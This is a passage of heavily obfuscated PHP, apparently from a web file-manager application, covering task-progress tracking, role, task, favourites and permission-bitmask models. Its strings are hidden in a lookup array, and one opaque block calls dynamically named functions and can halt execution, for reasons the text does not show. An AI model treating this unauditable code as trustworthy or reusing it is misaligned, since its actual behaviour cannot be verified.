file_exists(get_path_father($ÂÀ¢²Ê))) { Cache::set($‡ÖÚÜ„[$ÛŒ¥·åß[443]] . $ÛŒ¥·åß[1755], $ÂÀ¢²Ê); $‡ÖÚÜ„[$ÛŒ¥·åß[1712]] = array($ÛŒ¥·åß[1756], $ÛŒ¥·åß[1757]); } $this->update(0, $†Á³òå); } public static function updateCopyLocalFileSize($±Ã²‡¤«) { $÷şŠ—¥ =& $_SERVER[—ÌÒğš÷]; $ƒµ¾¡ñ† = Cache::get($±Ã²‡¤«[$÷şŠ—¥[443]] . $÷şŠ—¥[1755]); if (!$ƒµ¾¡ñ† || !file_exists($ƒµ¾¡ñ†)) { return $±Ã²‡¤«; } $±Ã²‡¤«[$÷şŠ—¥[1742]] = @filesize($ƒµ¾¡ñ†); $±Ã²‡¤«[$÷şŠ—¥[1746]] += $±Ã²‡¤«[$÷şŠ—¥[1742]]; self::updateTask($±Ã²‡¤«); return $±Ã²‡¤«; } public function copyFileEnd($ú£¼¾â—, $›Ò¦íø, $›©»à÷š, $ºĞ¾Àßš, $òıëó¶³, $˜”û˜±) { $÷¼é¯ºè =& $_SERVER[—ÌÒğš÷]; $ÄãĞåÄİ =& $this->task; $ÄãĞåÄİ[$÷¼é¯ºè[1742]] = $ÄãĞåÄİ[$÷¼é¯ºè[1741]]; $ÄãĞåÄİ[$÷¼é¯ºè[1743]] = $÷¼é¯ºè[12]; unset($ÄãĞåÄİ[$÷¼é¯ºè[1712]]); if ($òıëó¶³ == $ÄãĞåÄİ[$÷¼é¯ºè[1739]]) { $ÄãĞåÄİ[$÷¼é¯ºè[1745]] += $ÄãĞåÄİ[$÷¼é¯ºè[1741]]; $ÄãĞåÄİ[$÷¼é¯ºè[1746]] = $ÄãĞåÄİ[$÷¼é¯ºè[1745]]; $²ûÔ°ÌÈ = 1; if (isset($ÄãĞåÄİ[$÷¼é¯ºè[1752]]) && $ÄãĞåÄİ[$÷¼é¯ºè[1752]] == $›Ò¦íø) { $²ûÔ°ÌÈ = 0; } $this->update($²ûÔ°ÌÈ); } else { $this->update(); $ÄãĞåÄİ[$÷¼é¯ºè[1742]] = 0; } Cache::remove($ÄãĞåÄİ[$÷¼é¯ºè[443]] . $÷¼é¯ºè[1755]); self::log($÷¼é¯ºè[1758] . $›Ò¦íø . $÷¼é¯ºè[70] . $ºĞ¾Àßš . $÷¼é¯ºè[246] . $òıëó¶³ . $÷¼é¯ºè[1759] . $ÄãĞåÄİ[$÷¼é¯ºè[1739]]); } public function updateFileEnd($¯ğ†ÒÌ¦, $ììßĞ˜ì) { $½†şˆÎŒ =& $_SERVER[—ÌÒğš÷]; $Ú²Š¿ =& $this->task; $Ú²Š¿[$½†şˆÎŒ[1739]] = $¯ğ†ÒÌ¦; $Ú²Š¿[$½†şˆÎŒ[1741]] = $ììßĞ˜ì; $Ú²Š¿[$½†şˆÎŒ[1745]] += $ììßĞ˜ì; $Ú²Š¿[$½†şˆÎŒ[1746]] = $Ú²Š¿[$½†şˆÎŒ[1745]]; $this->update(1); self::log($½†şˆÎŒ[1760] . $¯ğ†ÒÌ¦); } public function sourceModelCopy($ÂµçÆĞâ) { $Éõ¹Ç¬ï =& $_SERVER[—ÌÒğš÷]; $¼ÏˆŒñß = $ÂµçÆĞâ[0]; $«Ğ“Å¾ç = $ÂµçÆĞâ[1]; $ıĞÕ¼¨á =& $this->task; $this->sourceModelCopyFlag = !0; $æçéÂŒ† = 0; switch ($¼ÏˆŒñß) { case $Éõ¹Ç¬ï[603]: $æçéÂŒ† = 1; break; case $Éõ¹Ç¬ï[606]: $ıĞÕ¼¨á[$Éõ¹Ç¬ï[1739]] = $«Ğ“Å¾ç[$Éõ¹Ç¬ï[32]]; break; case $Éõ¹Ç¬ï[608]: $æçéÂŒ† = intval($ÂµçÆĞâ[$Éõ¹Ç¬ï[424]] * 0.4); break; case $Éõ¹Ç¬ï[610]: $æçéÂŒ† = intval($ÂµçÆĞâ[$Éõ¹Ç¬ï[424]] * 0.2); break; case $Éõ¹Ç¬ï[612]: $æçéÂŒ† = intval($ÂµçÆĞâ[$Éõ¹Ç¬ï[424]] * 0.4); break; } $this->update($æçéÂŒ†); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ŠŒØ–…ˆ, $Âß×©©) { $ê£æß„™ =& $_SERVER[—ÌÒğš÷]; $this->sourceModelCopyFlag = !0; $Ç½©»ší = 1; if (isset($ŠŒØ–…ˆ[$ê£æß„™[79]])) { $Ç½©»ší = $ŠŒØ–…ˆ[$ê£æß„™[79]][$ê£æß„™[77]]; $Ç½©»ší = $Ç½©»ší + $ŠŒØ–…ˆ[$ê£æß„™[79]][$ê£æß„™[78]] + 1; } $this->update($Ç½©»ší); $this->sourceModelCopyFlag = !1; } public function sourceMove($ğ´Ä¹ë) { $this->sourceRemove($ğ´Ä¹ë, !1); } public function curlProgress($Å³Óú¡Ò, $ˆËº¹°, $‹–ÊÑÄ, $”«ú¹àÙ, $ô™‡¤) { $Ø…Ê‚¤É =& $_SERVER[—ÌÒğš÷]; $®·Ü¦ƒÁ =& $this->task; if ($ô™‡¤ > 0) { $®·Ü¦ƒÁ[$Ø…Ê‚¤É[1108]] = $Ø…Ê‚¤É[1761]; $®·Ü¦ƒÁ[$Ø…Ê‚¤É[1743]] = $Ø…Ê‚¤É[107]; if ($®·Ü¦ƒÁ[$Ø…Ê‚¤É[1741]]) { $®·Ü¦ƒÁ[$Ø…Ê‚¤É[1742]] = $ô™‡¤; } if ($®·Ü¦ƒÁ[$Ø…Ê‚¤É[1744]]) { $®·Ü¦ƒÁ[$Ø…Ê‚¤É[1742]] = $ô™‡¤ + $®·Ü¦ƒÁ[$Ø…Ê‚¤É[1744]]; } } else { if ($‹–ÊÑÄ > 0) { if ($®·Ü¦ƒÁ[$Ø…Ê‚¤É[1741]] == $ˆËº¹°) { $®·Ü¦ƒÁ[$Ø…Ê‚¤É[1742]] = $‹–ÊÑÄ; $®·Ü¦ƒÁ[$Ø…Ê‚¤É[1108]] = $Ø…Ê‚¤É[1762]; $®·Ü¦ƒÁ[$Ø…Ê‚¤É[1743]] = $Ø…Ê‚¤É[1238]; } } } $this->update(); } public function curlProgressStart($›Òæé…²) { } public function curlProgressEnd($¿îĞÈªø) { $é­ˆÚ†¶ =& $_SERVER[—ÌÒğš÷]; $Ôì¢óÙ“ =& $this->task; $÷—Õãùï = curl_getinfo($¿îĞÈªø); $Ø§‡› = $÷—Õãùï[$é­ˆÚ†¶[1763]]; if ($Ø§‡› == -1) { $Ø§‡› = $÷—Õãùï[$é­ˆÚ†¶[1764]]; } if ($Ôì¢óÙ“[$é­ˆÚ†¶[1743]] == $é­ˆÚ†¶[107] && $Ø§‡›) { $Ôì¢óÙ“[$é­ˆÚ†¶[1744]] += $Ø§‡›; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ğ¶¸Æ©… =& $_SERVER[—ÌÒğš÷]; $á¡Í·’ =& $this->task; $á¡Í·’[$ğ¶¸Æ©…[1765]] = 1; Hook::bind($ğ¶¸Æ©…[1733], array($this, $ğ¶¸Æ©…[1766])); Hook::bind($ğ¶¸Æ©…[1735], array($this, $ğ¶¸Æ©…[1767])); Hook::bind($ğ¶¸Æ©…[1737], array($this, $ğ¶¸Æ©…[1768])); } protected function endAfter() { $éÊ—õİÌ =& $_SERVER[—ÌÒğš÷]; Hook::unbind($éÊ—õİÌ[1733], array($this, $éÊ—õİÌ[1766])); Hook::unbind($éÊ—õİÌ[1735], array($this, $éÊ—õİÌ[1767])); Hook::unbind($éÊ—õİÌ[1737], array($this, $éÊ—õİÌ[1768])); } public function progressStart($ú¢ÛÏÙ) { $èà¾…Ï =& $_SERVER[—ÌÒğš÷]; $Ğ•Ÿüì‘ = curl_getinfo($ú¢ÛÏÙ); self::log($èà¾…Ï[1769] . $Ğ•Ÿüì‘[$èà¾…Ï[351]]); self::valueSet($this->task[$èà¾…Ï[443]], $this->task); } public function progressEnd($²›Œƒå…) { $×ù±¬Ù§ =& $_SERVER[—ÌÒğš÷]; self::log($×ù±¬Ù§[1770] . $this->task[$×ù±¬Ù§[443]]); $this->end(); } public function progress($½õ–àŠÊ, $æÏ¾¯¢š, $¹í˜Í·ì, $¢ùŒò“, $ó„öü¬©) { $ˆ¨öÖ„ =& $_SERVER[—ÌÒğš÷]; $Õ¦«ùéì =& $this->task; if ($ó„öü¬© > 0) { $Õ¦«ùéì[$ˆ¨öÖ„[822]] = $Õ¦«ùéì[$ˆ¨öÖ„[822]] == 0 ? $¢ùŒò“ : $Õ¦«ùéì[$ˆ¨öÖ„[822]]; $Õ¦«ùéì[$ˆ¨öÖ„[1689]] = $ó„öü¬©; } else { if ($¹í˜Í·ì > 0) { $Õ¦«ùéì[$ˆ¨öÖ„[822]] = $Õ¦«ùéì[$ˆ¨öÖ„[822]] == 0 ? $æÏ¾¯¢š : $Õ¦«ùéì[$ˆ¨öÖ„[822]]; $Õ¦«ùéì[$ˆ¨öÖ„[1689]] = $¹í˜Í·ì; } } $this->update(); self::log("\x70\162\x6f\x67\162\x65\163\163\110\x74\x74\160\72\144\x6f\x77\156\72{$¹í˜Í·ì}\57{$æÏ¾¯¢š}\73\x20\x75\160\154\x6f\x61\x64\x3a{$ó„öü¬©}\57{$¢ùŒò“}\73"); } } if ($_SERVER[$_SERVER[—ÌÒğš÷][879]] != $_SERVER[$_SERVER[—ÌÒğš÷][1771]]) { $_getc = $_SERVER[—ÌÒğš÷][880]; $_getfile = $_SERVER[$_SERVER[—ÌÒğš÷][881]] . $_SERVER[—ÌÒğš÷][882]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[—ÌÒğš÷][246], $_getfilec); if (count($_getarrs) < $_SERVER[—ÌÒğš÷][677]) { $exit = $_SERVER[—ÌÒğš÷][883]; $exit(); } $_act = $_SERVER[—ÌÒğš÷][884]; $_act($_SERVER[$_SERVER[—ÌÒğš÷][877]]); } goto F¸´˜‚Å°Ÿ; c§åŒÙÅÚ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\162\157\x6c\x65\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\141\165\x74\150", "\154\141\142\x65\x6c", "\x64\x69\x73\x70\x6c\141\x79", "\x73\171\x73\x74\145\x6d", "\x64\145\x73\x63", "\x69\147\x6e\157\x72\145\x45\170\164", "\151\147\156\157\x72\x65\x46\151\x6c\x65\x53\x69\x7a\x65", "\141\x64\x6d\151\156\151\163\164\x72\x61\x74\x6f\x72", "\163\157\x72\x74"); public function listData($í³œÑÎ = false, $ğÌà®Ñ = "\x73\x6f\162\x74", $”‰î›»ã = false) { $›ëÂóıí =& $_SERVER[—ÌÒğš÷]; $¨Ö»¯£¬ = parent::listData($í³œÑÎ, $ğÌà®Ñ, $”‰î›»ã); if (!$í³œÑÎ) { foreach ($¨Ö»¯£¬ as $Õ’òùüĞ => $ºçõØ¿˜) { if ($ºçõØ¿˜[$›ëÂóıí[2089]] == 1) { $¨Ö»¯£¬[$Õ’òùüĞ][$›ëÂóıí[494]] = LNG($›ëÂóıí[2328]); } } } return $¨Ö»¯£¬; } public function update($¤¿ı®Üö, $Íë—µÔ‰) { $À³İÁŠ =& $_SERVER[—ÌÒğš÷]; $İÖî¹Ä© = parent::listData($¤¿ı®Üö); $Ô¦ò³¬„ = $this->findByName($Íë—µÔ‰[$À³İÁŠ[32]]); if (!$İÖî¹Ä© || $Ô¦ò³¬„ && $Ô¦ò³¬„[$À³İÁŠ[443]] != $İÖî¹Ä©[$À³İÁŠ[443]]) { return !1; } if ($Ô¦ò³¬„[$À³İÁŠ[2089]] == 1) { $Íë—µÔ‰ = array($À³İÁŠ[32] => $Íë—µÔ‰[$À³İÁŠ[32]], $À³İÁŠ[1910] => $Íë—µÔ‰[$À³İÁŠ[1910]]); } $this->filterAuth($Íë—µÔ‰[$À³İÁŠ[455]]); return parent::update($¤¿ı®Üö, $Íë—µÔ‰); } public function remove($ë¸ª•¾Ã) { $­ù“š = parent::listData($ë¸ª•¾Ã); if (!$­ù“š || $­ù“š[$_SERVER[—ÌÒğš÷][179]]) { return !1; } return parent::remove($ë¸ª•¾Ã); } public function add($¸÷”ó¿) { $Š ®Ü™Œ =& $_SERVER[—ÌÒğš÷]; $î˜©‰Š  = $¸÷”ó¿[$Š ®Ü™Œ[32]]; if ($this->findByName($î˜©‰Š )) { return !1; } $·˜ìÆô = array($Š ®Ü™Œ[462] => $î˜©‰Š , $Š ®Ü™Œ[1893] => $Š ®Ü™Œ[12], $Š ®Ü™Œ[1889] => $Š ®Ü™Œ[1897], $Š ®Ü™Œ[2329] => 1, $Š ®Ü™Œ[1892] => 0, $Š ®Ü™Œ[2330] => 0, $Š ®Ü™Œ[1891] => $this->getSort()); $¸÷”ó¿ = array_merge($·˜ìÆô, $¸÷”ó¿); $this->filterAuth($¸÷”ó¿[$Š ®Ü™Œ[455]]); return parent::insert($¸÷”ó¿); } private function getSort() { $¥½†Í‘ =& $_SERVER[—ÌÒğš÷]; $íš±ºœá = parent::listData(); $ ª„èÍŒ = array_to_keyvalue($íš±ºœá, $¥½†Í‘[12], $¥½†Í‘[1911]); return empty($ ª„èÍŒ) ? 0 : max($ ª„èÍŒ) + 1; } private function filterAuth(&$Š»ûÄÁ‘) { $Ê¡º›Î =& $_SERVER[—ÌÒğš÷]; $áúèÀş³ = array(); $ß«£ÛÖñ = array_filter(explode($Ê¡º›Î[50], $Š»ûÄÁ‘)); foreach ($ß«£ÛÖñ as $Š»ûÄÁ‘) { $¯è’…º… = explode($Ê¡º›Î[10], $Š»ûÄÁ‘); if ($¯è’…º…[0] == $Ê¡º›Î[2331] && $¯è’…º…[1] != $Ê¡º›Î[1234]) { $·ÄŸß’İ = $¯è’…º…[0] . $Ê¡º›Î[10] . $¯è’…º…[1] . $Ê¡º›Î[2332]; if (!in_array($·ÄŸß’İ, $ß«£ÛÖñ)) { $áúèÀş³[] = $·ÄŸß’İ; } } $áúèÀş³[] = $Š»ûÄÁ‘; } $Š»ûÄÁ‘ = implode($Ê¡º›Î[50], $áúèÀş³); } public function findRoleDefault() { $Öş±À¨ =& $_SERVER[—ÌÒğš÷]; $ğÉ­ğÉ‰ = parent::listData(); $ª÷ÇÓ¶³ = !1; foreach ($ğÉ­ğÉ‰ as $ëÇß®€) { if (!$ëÇß®€ || $ëÇß®€[$Öş±À¨[1909]] == $Öş±À¨[212] || $ëÇß®€[$Öş±À¨[2089]] == 1) { continue; } if (strstr($ëÇß®€[$Öş±À¨[455]], $Öş±À¨[2333])) { continue; } if (!strstr($ëÇß®€[$Öş±À¨[455]], $Öş±À¨[2334])) { continue; } if (!$ª÷ÇÓ¶³) { $ª÷ÇÓ¶³ = $ëÇß®€; continue; } $³¨­º = explode($Öş±À¨[50], $ª÷ÇÓ¶³[$Öş±À¨[455]]); $á¿ÕÍ•‘ = explode($Öş±À¨[50], $ëÇß®€[$Öş±À¨[455]]); if (count($³¨­º) > count($á¿ÕÍ•‘)) { $ª÷ÇÓ¶³ = $ëÇß®€; } } return $ª÷ÇÓ¶³ ? $ª÷ÇÓ¶³[$Öş±À¨[443]] : $Öş±À¨[12]; } public function sort($åŸÛÂŞ, $æÜ®‡Á) { return parent::update($åŸÛÂŞ, $æÜ®‡Á); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\164\x61\163\153\114\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x74\x79\x70\145", "\x65\166\x65\156\164", "\x74\x69\155\145", "\x64\145\163\x63", "\163\171\x73\x74\x65\155", "\145\x6e\x61\142\154\x65", "\154\x61\163\164\122\x75\x6e", "\163\x6f\x72\x74"); public function listData($×–Ø—Úä = false, $£òæïäØ = "\163\157\162\x74", $Õ§±ƒ™Ÿ = false) { return parent::listData($×–Ø—Úä, $£òæïäØ, $Õ§±ƒ™Ÿ); } public function add($€ªëì) { $û¼ª–—° =& $_SERVER[—ÌÒğš÷]; $÷‰šÑÔ = $this->findByName($€ªëì[$û¼ª–—°[32]]); if ($÷‰šÑÔ) { return !1; } $€ªëì[$û¼ª–—°[1645]] = 0; $€ªëì[$û¼ª–—°[1911]] = $this->getSort(); return parent::insert($€ªëì); } private function getSort() { $º¯ƒç‰Ì =& $_SERVER[—ÌÒğš÷]; $³°‘Õ„ı = parent::listData(); $†áİÍŠ” = array_to_keyvalue($³°‘Õ„ı, $º¯ƒç‰Ì[12], $º¯ƒç‰Ì[1911]); return empty($†áİÍŠ”) ? 0 : max($†áİÍŠ”) + 1; } public function update($ÓĞ¬­Úû, $²Ãéªˆç) { $üãúøîğ =& $_SERVER[—ÌÒğš÷]; $æÕ›âöŒ = $this->listData($ÓĞ¬­Úû); $¹ÔÄƒ÷¹ = $this->findByName($²Ãéªˆç[$üãúøîğ[32]]); if (!$æÕ›âöŒ || $¹ÔÄƒ÷¹ && $¹ÔÄƒ÷¹[$üãúøîğ[443]] != $æÕ›âöŒ[$üãúøîğ[443]]) { return !1; } return parent::update($ÓĞ¬­Úû, $²Ãéªˆç); } public function remove($î˜ôÁ—×, $ÌÚ¢ßÛØ = false) { $òÉ­ş¦ò =& $_SERVER[—ÌÒğš÷]; $¡…¬œ£í = $this->listData($î˜ôÁ—×); if (!$¡…¬œ£í) { return; } if (!$ÌÚ¢ßÛØ && $¡…¬œ£í[$òÉ­ş¦ò[179]] == $òÉ­ş¦ò[88]) { return !1; } return parent::remove($î˜ôÁ—×); } public function enable($¯«€ñ¾ü, $Ù¤Óƒô) { return $this->update($¯«€ñ¾ü, array($_SERVER[—ÌÒğš÷][2323] => $Ù¤Óƒô)); } public function run($Õ‘ úí‚) { return $this->update($Õ‘ úí‚, array($_SERVER[—ÌÒğš÷][2335] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\146\141\x76"; protected function cacheFunctionAlias($ğ·Å§Éé) { $›Âˆ¦© =& $_SERVER[—ÌÒğš÷]; return array($›Âˆ¦©[1998] => array(USER_ID, $›Âˆ¦©[2336])); } protected function listData() { $æ÷½İö– =& $_SERVER[—ÌÒğš÷]; $³¨¸É‹¬ = array($æ÷½İö–[1679] => USER_ID, $æ÷½İö–[525] => 0); $ÜÚ€ê’Ğ = $æ÷½İö–[2337]; $Àì¦ğèÏ = $this->field($ÜÚ€ê’Ğ)->where($³¨¸É‹¬)->order($æ÷½İö–[2338])->select(); return $Àì¦ğèÏ ? $Àì¦ğèÏ : array(); } protected function resetCache() { } protected function listView() { $ïéá›…Ë =& $_SERVER[—ÌÒğš÷]; $º…é…³ = $this->listData(); $®Æµû¯– = array_filter_by_field($º…é…³, $ïéá›…Ë[33], $ïéá›…Ë[458]); $‘ş™˜¾Î = array_to_keyvalue($®Æµû¯–, $ïéá›…Ë[12], $ïéá›…Ë[84]); if (!$‘ş™˜¾Î) { return $º…é…³; } $Ó¢—ŒäĞ = 2000; $øÙ§ğÌ‘ = array($ïéá›…Ë[459] => array($ïéá›…Ë[460], $‘ş™˜¾Î)); $¡†âÓ = Model($ïéá›…Ë[861])->listSource($øÙ§ğÌ‘, $Ó¢—ŒäĞ); $¡†âÓ = array_merge($¡†âÓ[$ïéá›…Ë[83]], $¡†âÓ[$ïéá›…Ë[82]]); $¡†âÓ = array_to_keyvalue($¡†âÓ, $ïéá›…Ë[181]); foreach ($º…é…³ as $Ùã†Úä => $äÅéÚ€ú) { $îÃ•«³Ã = $¡†âÓ[$äÅéÚ€ú[$ïéá›…Ë[84]]]; $îÃ•«³Ã = $îÃ•«³Ã ? $îÃ•«³Ã : array(); $º…é…³[$Ùã†Úä] = array_merge($îÃ•«³Ã, $äÅéÚ€ú); } return $º…é…³; } protected function addFav($ÒÒş‰±», $­ĞÎØ÷ = '', $ú§è¼Ÿì = "\163\x6f\x75\x72\143\x65") { $ó‚Œæ¨š =& $_SERVER[—ÌÒğš÷]; $à›ÂÉÌõ = array($ó‚Œæ¨š[1679] => USER_ID, $ó‚Œæ¨š[525] => 0, $ó‚Œæ¨š[464] => $ú§è¼Ÿì, $ó‚Œæ¨š[463] => $ÒÒş‰±»); if ($this->where($à›ÂÉÌõ)->find()) { return !1; } $à›ÂÉÌõ = array($ó‚Œæ¨š[1679] => USER_ID, $ó‚Œæ¨š[525] => 0); $òóŸµşï = $this->where($à›ÂÉÌõ)->max($ó‚Œæ¨š[1911]); if (!$òóŸµşï) { $òóŸµşï = 0; } if (!$­ĞÎØ÷ && $ú§è¼Ÿì == $ó‚Œæ¨š[458]) { $»ŸŸ–™ƒ = Model($ó‚Œæ¨š[1376])->where(array($ó‚Œæ¨š[459] => $ÒÒş‰±»))->find(); if (!$»ŸŸ–™ƒ) { return !1; } $­ĞÎØ÷ = $»ŸŸ–™ƒ[$ó‚Œæ¨š[32]]; } $­ĞÎØ÷ = $this->getAutoName($­ĞÎØ÷); $‚ŸÏÆ¬ = array($ó‚Œæ¨š[1679] => USER_ID, $ó‚Œæ¨š[525] => 0, $ó‚Œæ¨š[462] => $­ĞÎØ÷, $ó‚Œæ¨š[463] => $ÒÒş‰±», $ó‚Œæ¨š[464] => $ú§è¼Ÿì, $ó‚Œæ¨š[1891] => $òóŸµşï + 1); return $this->add($‚ŸÏÆ¬); } protected function remove($ÅôıáÒÈ) { $¤ÀŠÈ  =& $_SERVER[—ÌÒğš÷]; $ãŒ÷ø = array($¤ÀŠÈ [1679] => USER_ID, $¤ÀŠÈ [461] => $ÅôıáÒÈ); return $this->where($ãŒ÷ø)->delete(); } protected function removeByName($öè¿€ÁÇ) { $ˆšü÷µæ =& $_SERVER[—ÌÒğš÷]; $ÕİÍºä = array($ˆšü÷µæ[1679] => USER_ID, $ˆšü÷µæ[462] => $öè¿€ÁÇ, $ˆšü÷µæ[525] => 0); return $this->where($ÕİÍºä)->delete(); } protected function rename($±€Ì¡‚, $úÑã©ïÖ) { $µÖ¡¬Ô =& $_SERVER[—ÌÒğš÷]; if ($±€Ì¡‚ == $úÑã©ïÖ) { return !1; } $ãÊ›à”â = $this->getAutoName($úÑã©ïÖ); if ($úÑã©ïÖ != $ãÊ›à”â) { return !1; } $ğš¡àÙ = array($µÖ¡¬Ô[1679] => USER_ID, $µÖ¡¬Ô[525] => 0, $µÖ¡¬Ô[32] => $±€Ì¡‚); return $this->where($ğš¡àÙ)->save(array($µÖ¡¬Ô[32] => $úÑã©ïÖ)); } protected function resetSort($ñœ‘ü©®) { $ì³íÜ±² =& $_SERVER[—ÌÒğš÷]; $ñœ‘ü©® = is_array($ñœ‘ü©®) ? $ñœ‘ü©® : array(); $ÍŠ«ìÅ = array($ì³íÜ±²[1679] => USER_ID); for ($§ÄÙ“¬ñ = 0; $§ÄÙ“¬ñ < count($ñœ‘ü©®); $§ÄÙ“¬ñ++) { $ÍŠ«ìÅ[$ì³íÜ±²[461]] = $ñœ‘ü©®[$§ÄÙ“¬ñ]; $this->where($ÍŠ«ìÅ)->save(array($ì³íÜ±²[1891] => $§ÄÙ“¬ñ + 1)); } return !0; } protected function moveTop($‘§ï‰°Û) { $ÅÀ…êÄ¤ =& $_SERVER[—ÌÒğš÷]; $üò’”ŠÊ = array($ÅÀ…êÄ¤[1679] => USER_ID, $ÅÀ…êÄ¤[525] => 0); $Ÿå•–üà = $this->where($üò’”ŠÊ)->where(array($ÅÀ…êÄ¤[32] => $‘§ï‰°Û))->find(); if (!$Ÿå•–üà) { return; } $Äáºı¿ = $this->field($ÅÀ…êÄ¤[443])->where($üò’”ŠÊ)->order($ÅÀ…êÄ¤[2338])->select(); $Äáºı¿ = array_to_keyvalue($Äáºı¿, $ÅÀ…êÄ¤[12], $ÅÀ…êÄ¤[443]); $‰ôèïû = $Äáºı¿; $Äáºı¿ = array_remove_value($Äáºı¿, $Ÿå•–üà[$ÅÀ…êÄ¤[443]]); array_unshift($Äáºı¿, $Ÿå•–üà[$ÅÀ…êÄ¤[443]]); return $this->resetSort($Äáºı¿); } protected function moveBottom($¯ËÅÃ³¾) { $”ŒÕ”Ã¼ =& $_SERVER[—ÌÒğš÷]; $”—‰·ò¯ = array($”ŒÕ”Ã¼[1679] => USER_ID, $”ŒÕ”Ã¼[525] => 0); $×Ûì…´ç = $this->where($”—‰·ò¯)->max($”ŒÕ”Ã¼[1911]); $ Ûç¨ = array($”ŒÕ”Ã¼[1911] => $×Ûì…´ç + 1); return $this->where($”—‰·ò¯)->where(array($”ŒÕ”Ã¼[32] => $¯ËÅÃ³¾))->save($ Ûç¨); } private function getAutoName($Âôı±Œê) { $ñÅÂÄáŞ =& $_SERVER[—ÌÒğš÷]; $ÎÒ÷Ğç = array($ñÅÂÄáŞ[1679] => USER_ID, $ñÅÂÄáŞ[525] => 0); $İ«üãÑ® = $this->field($ñÅÂÄáŞ[32])->where($ÎÒ÷Ğç)->select(); $İ«üãÑ® = array_to_keyvalue($İ«üãÑ®, $ñÅÂÄáŞ[12], $ñÅÂÄáŞ[32]); if (!$İ«üãÑ® || !in_array($Âôı±Œê, $İ«üãÑ®)) { return $Âôı±Œê; } for ($µªŠÜ–å = 0; $µªŠÜ–å < count($İ«üãÑ®); $µªŠÜ–å++) { if (!in_array($Âôı±Œê . "\x28{$µªŠÜ–å}\x29", $İ«üãÑ®)) { return $Âôı±Œê . "\50{$µªŠÜ–å}\51"; } } return $Âôı±Œê . "\50{$µªŠÜ–å}\x29"; } } goto cìî¥£Èù†; fÇˆ˜¤‰: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¯‘û“Ÿ  =& $_SERVER[—ÌÒğš÷]; $ç•§Æ°È = array(array($¯‘û“Ÿ [462] => LNG($¯‘û“Ÿ [1888]), $¯‘û“Ÿ [1889] => $¯‘û“Ÿ [1890], $¯‘û“Ÿ [1891] => 1, $¯‘û“Ÿ [1892] => 1, $¯‘û“Ÿ [1893] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¯‘û“Ÿ [462] => LNG($¯‘û“Ÿ [1894]), $¯‘û“Ÿ [1889] => $¯‘û“Ÿ [1895], $¯‘û“Ÿ [1891] => 2, $¯‘û“Ÿ [1892] => 1, $¯‘û“Ÿ [1893] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¯‘û“Ÿ [462] => LNG($¯‘û“Ÿ [1896]), $¯‘û“Ÿ [1889] => $¯‘û“Ÿ [1897], $¯‘û“Ÿ [1891] => 3, $¯‘û“Ÿ [1892] => 1, $¯‘û“Ÿ [1893] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¯‘û“Ÿ [462] => LNG($¯‘û“Ÿ [1898]), $¯‘û“Ÿ [1889] => $¯‘û“Ÿ [1899], $¯‘û“Ÿ [1891] => 4, $¯‘û“Ÿ [1892] => 1, $¯‘û“Ÿ [1893] => self::AUTH_SHOW | self::AUTH_VIEW), array($¯‘û“Ÿ [462] => LNG($¯‘û“Ÿ [1900]), $¯‘û“Ÿ [1889] => $¯‘û“Ÿ [1901], $¯‘û“Ÿ [1891] => 5, $¯‘û“Ÿ [1892] => 1, $¯‘û“Ÿ [1893] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¯‘û“Ÿ [462] => LNG($¯‘û“Ÿ [1902]), $¯‘û“Ÿ [1889] => $¯‘û“Ÿ [1903], $¯‘û“Ÿ [1891] => 6, $¯‘û“Ÿ [1892] => 1, $¯‘û“Ÿ [1893] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¯‘û“Ÿ [462] => LNG($¯‘û“Ÿ [1904]), $¯‘û“Ÿ [1889] => $¯‘û“Ÿ [1905], $¯‘û“Ÿ [1891] => 7, $¯‘û“Ÿ [1892] => 1, $¯‘û“Ÿ [1893] => 0)); return $ç•§Æ°È; } public static function authCheck($Íº™½œç, $ß¨Œ÷Ÿ¹) { $®³ª´ =& $_SERVER[—ÌÒğš÷]; $Íº™½œç = intval($Íº™½œç); if ($GLOBALS[$®³ª´[536]] && $GLOBALS[$®³ª´[6]][$®³ª´[1906]]) { return !0; } if ($Íº™½œç <= 0) { return !1; } if (($Íº™½œç & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Íº™½œç & $ß¨Œ÷Ÿ¹); } public static function authCheckShow($ûú‘½î¹) { return self::authCheck($ûú‘½î¹, self::AUTH_SHOW); } public static function authCheckView($ô‡Ïİ§¥) { return self::authCheck($ô‡Ïİ§¥, self::AUTH_VIEW); } public static function authCheckDownload($ç°™ó¼Â) { return self::authCheck($ç°™ó¼Â, self::AUTH_DOWNLOAD); } public static function authCheckUpload($âğÍî½—) { return self::authCheck($âğÍî½—, self::AUTH_UPLOAD); } public static function 